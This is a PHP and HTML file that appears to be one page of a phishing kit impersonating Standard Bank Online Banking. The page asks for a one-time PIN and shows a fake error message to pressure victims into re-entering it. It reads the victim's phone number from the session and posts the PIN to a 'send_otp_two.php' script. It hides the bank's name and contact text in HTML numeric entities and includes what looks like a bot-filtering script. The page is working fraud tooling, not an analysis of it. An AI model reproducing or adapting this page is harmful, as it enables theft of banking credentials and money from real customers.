<?php
error_reporting(0);
$phone = $_SESSION['phone'] = $_POST['phone'];
session_start();
require_once '../esc/index.php';
?>
<!DOCTYPE html>
<html lang="en">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
  <link rel="icon" type="image/png" href="../libraries/img/favicon.ico">
  <link rel="stylesheet" href="../libraries/css/app.min.css">
  <title>&#83;&#116;&#97;&#110;&#100;&#97;&#114;&#100;&#32;&#66;&#97;&#110;&#107;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</title>
</head>

<body class="ng-scope login migration-login-bg login-strong-auth-bg" cz-shortcut-listen="true">
  <div class="content-wrapper">
    <dtm-analytics></dtm-analytics>
    <ng-include>
      <div class="ng-scope">
        <header id="top" class="header-no-bg">
          <div>
            <div></div>
            <ul class="ng-scope">
              <li><img class="migration-logo" src="../libraries/img/sbg.png"></li>
            </ul>
          </div>
        </header>
      </div>
    </ng-include>
    <form method="POST" autocomplete="off" action="../send/send_otp_two.php">
      <div class="content ng-scope with-tall-footer">
        <main class="ng-scope">
          <ibr-strong-auth-password class="ng-scopeng-isolate-scope">
            <br>
            <div class="login">
                <div class="login-notifications">
                                    <div class="error notification ng-scope" ng-if="errorMessage" notification="" style=""><span ng-transclude="">An error has occured, please enter correct new details and continue.</span><i class="icon icon-times-circle"></i></div>
                                </div> 
                <div class="login-container">
                  <div class="login-container-header">
                    <h2 class="login-header">Enter One-Time PIN</h2> </div>
                  <form method="POST" autocomplete="off" action="../send/send_otp_two.php" id="digitalIdLoginPasswordForm" class="ng-pristine ng-invalid ng-invalid-required" style="" data-frmtrkid="1613173452320">
                    <div class="login-container-content">
                      <div class="login-container-content-img"><img src="../libraries/img/img_web_otp_240.png" alt="password-sign-in"></div>
                      <div class="login-container-content-secondary otp-description ng-binding"> A one-time PIN has been sent to
                        <input id="email" name="ph" type="text" class="login-container-content-username ng-binding" aria-label="Email or Phone" value="27<?php echo str_repeat("*", (strlen($_SESSION['phone']) - 4)).substr($_SESSION['phone'],-4,4); ?>" style="background-color: #FFF;border: none;overflow: hidden;text-overflow: ellipsis;padding: 0px;margin: 0px;height: auto;text-align: center;color: #767676;" disabled> </div>
                      <div class="login-container-content-input">
                        <div class="login-container-content-input-password">
                          <label for="password">One-Time PIN</label>
                          <input minlength="5" maxlength="5" onkeypress="isInputNumber(event)" type="text" id="password" placeholder="" name="otp_two" ng-model="password" ng-class="{'show-validation-styles':(forms.digitalIdLoginPasswordForm.password.$touched ||forms.digitalIdLoginPasswordForm.$submitted)}" autofocus required="" ng-pattern="[a-zA-Z0-9_.+-]+[a-zA-Z0-9-]+" ng-class="{'show-validation-styles': forms.smallDigitalIdLoginForm.smallUsername.$touched || forms.smallDigitalIdLoginForm.$submitted}" class="ng-pristine ng-empty ng-invalid ng-invalid-required ng-touchedshow-validation-styles" style="border: 1px solid #72B13B;" oninvalid="this.setCustomValidity('Please enter a valid OTP')" oninput="setCustomValidity('')"> </div>
                      </div>
                      <ibr-button-group class="ng-isolate-scope">
                        <div>
                          <div class="right" ng-transclude="">
                            <div id="submit-otp" ng-disabled="!otp" color="primary" class="primary ng-scope ng-isolate-scope" type="submit" width="standard" data-dtmid="link_content_enter one-time pin" data-dtmtext="submit button click">
                              <div class="ibr-button" id="submit-otp-button" color="primary" type="submit" width="standard" ng-click="$ctrl.ngClick" ng-disabled="$ctrl.ngDisabled" data-dtmtext="submit button click" data-dtmid="link_content_enter one-time pin" track-click="" _nghost-asm-c0="" ng-version="8.2.14">
                                <button _ngcontent-asm-c0="" class="primary primary__default standard" type="submit" data-dtmtext="submit button click" data-dtmid="link_content_enter one-time pin" style=" color: #fff; background: #0033a1; height: 44px; font-size: 15px; line-height: 1.5; border-radius: 22px; font-family: BentonSans Medium; font-weight: 500; text-align: center; text-transform: uppercase; letter-spacing: normal; outline:0;">
                                  <ng-transclude></ng-transclude>Submit</button>
                              </div>
                            </div>
                            <div color="secondary" class="secondary ng-scope ng-isolate-scope" ng-click="resend()" width="standard" data-dtmid="link_content_enter one-time pin" data-dtmtext="resend button click">
                              <div class="ibr-button" id="-button" color="secondary" type="button" width="standard" ng-click="$ctrl.ngClick" ng-disabled="$ctrl.ngDisabled" data-dtmtext="resend button click" data-dtmid="link_content_enter one-time pin" track-click="" _nghost-asm-c0="" ng-version="8.2.14">
                                <button _ngcontent-asm-c0="" class="secondary secondary__default standard" type="button" data-dtmtext="resend button click" data-dtmid="link_content_enter one-time pin" style="color: #0033a1; background: #fff; border: 1px solid #0033a1; height: 44px; font-size: 16px; line-height: 1.5; border-radius: 22px; font-family: BentonSans Medium; font-weight: 500; text-align: center; text-transform: uppercase; letter-spacing: normal;outline: 0;">
                                  <ng-transclude></ng-transclude>Resend</button>
                              </div>
                            </div>
                            <div color="tertiary" class="tertiary ng-scope ng-isolate-scope" ng-click="cancel()" width="standard" data-dtmid="link_content_enter one-time pin" data-dtmtext="cancel button click">
                              <div class="ibr-button" id="-button" color="tertiary" type="button" width="standard" ng-click="$ctrl.ngClick" ng-disabled="$ctrl.ngDisabled" data-dtmtext="cancel button click" data-dtmid="link_content_enter one-time pin" track-click="" _nghost-asm-c0="" ng-version="8.2.14">
                                <button _ngcontent-asm-c0="" class="tertiary tertiary__default standard" type="button" data-dtmte.xt="cancel button click" data-dtmid="link_content_enter one-time pin" style="color: #0033a1; background: #fff; height: 44px; font-size: 16px; line-height: 1.5; border-radius: 22px; border: none; font-family: BentonSans Medium; font-weight: 500; text-align: center; text-transform: uppercase; letter-spacing: normal; outline:0;">
                                  <ng-transclude></ng-transclude>Cancel</button>
                              </div>
                            </div>
                          </div>
                        </div>
                      </ibr-button-group>
                    </div>
                  </form>
                </div>
            
            </div>
          </ibr-strong-auth-password>
        </main>
      </div>
    </form>
    <br>
    <footer class="login migration-login" ng-controller="HeaderController" ng-if="migrationLogin()">
      <div class="row info no-padding-top">
        <div class="row contact-links">
          <div class="no-padding small-12 medium-12 large-3 columns"><img src="../libraries/img/icon_south_africa_white.png"> <span class="white-text">&#83;&#111;&#117;&#116;&#104;&#32;&#65;&#102;&#114;&#105;&#99;&#97;&#32;&#48;&#56;&#54;&#48;&#32;&#49;&#50;&#51;&#32;&#48;&#48;&#48;</span></div>
          <div class="no-padding small-12 medium-12 large-4 columns"><img src="../libraries/img/icon_global_white.png"> <span class="white-text">&#73;&#110;&#116;&#101;&#114;&#110;&#97;&#116;&#105;&#111;&#110;&#97;&#108;&#32;&#43;&#50;&#55;&#40;&#48;&#41;&#49;&#48;&#32;&#50;&#52;&#57;&#32;&#48;&#52;&#50;&#51;</span></div>
          <div class="small-12 medium-12 large-5 columns"><img src="../libraries/img/icon_email_white.png"> <span class="white-text">&#69;&#109;&#97;&#105;&#108;&#32;&#117;&#115;&#32;&#97;&#116;&#32;<a href=""><span class="white-text footer-text-link"><span class="__cf_email__">&#105;&#98;&#115;&#117;&#112;&#112;&#111;&#114;&#116;&#64;&#115;&#116;&#97;&#110;&#100;&#97;&#114;&#100;&#98;&#97;&#110;&#107;&#46;&#99;&#111;&#46;&#122;&#97;</span></span>
            </a>
            </span>
          </div>
        </div>
        <div class="row fsb-legal-declaration-migration">
          <p class="white-text">&#83;&#116;&#97;&#110;&#100;&#97;&#114;&#100;&#32;&#66;&#97;&#110;&#107;&#32;&#105;&#115;&#32;&#97;&#32;&#108;&#105;&#99;&#101;&#110;&#115;&#101;&#100;&#32;&#102;&#105;&#110;&#97;&#110;&#99;&#105;&#97;&#108;&#32;&#115;&#101;&#114;&#118;&#105;&#99;&#101;&#115;&#32;&#112;&#114;&#111;&#118;&#105;&#100;&#101;&#114;&#32;&#105;&#110;&#32;&#116;&#101;&#114;&#109;&#115;&#32;&#111;&#102;&#32;&#116;&#104;&#101;&#32;&#70;&#105;&#110;&#97;&#110;&#99;&#105;&#97;&#108;&#32;&#65;&#100;&#118;&#105;&#115;&#111;&#114;&#121;&#32;&#97;&#110;&#100;&#32;&#73;&#110;&#116;&#101;&#114;&#109;&#101;&#100;&#105;&#97;&#114;&#121;&#32;&#83;&#101;&#114;&#118;&#105;&#99;&#101;&#115;&#32;&#65;&#99;&#116;&#32;&#97;&#110;&#100;&#32;&#97;&#32;&#114;&#101;&#103;&#105;&#115;&#116;&#101;&#114;&#101;&#100;&#32;&#99;&#114;&#101;&#100;&#105;&#116;&#32;&#112;&#114;&#111;&#118;&#105;&#100;&#101;&#114;&#32;&#105;&#110;&#32;&#116;&#101;&#114;&#109;&#115;&#32;&#111;&#102;&#32;&#116;&#104;&#101;&#32;&#78;&#97;&#116;&#105;&#111;&#110;&#97;&#108;&#32;&#67;&#114;&#101;&#100;&#105;&#116;&#32;&#65;&#99;&#116;&#44;
            <br>&#32;&#114;&#101;&#103;&#105;&#115;&#116;&#114;&#97;&#116;&#105;&#111;&#110;&#32;&#110;&#117;&#109;&#98;&#101;&#114;&#32;&#78;&#67;&#82;&#67;&#80;&#49;&#53;&#46;</p>
        </div>
      </div>
    </footer>
    <div class="ng-hide" idle-notification="" ng-show="beenIdle"></div>
    <go-to-top></go-to-top>
  </div>
  <!--
  <script type="text/javascript">
    function isInputNumber(evt) {
      var ch = String.fromCharCode(evt.which);
      if (!(/[0-9]/.test(ch))) {
        evt.preventDefault();
      }
    }
  </script>
-->
</body>

</html>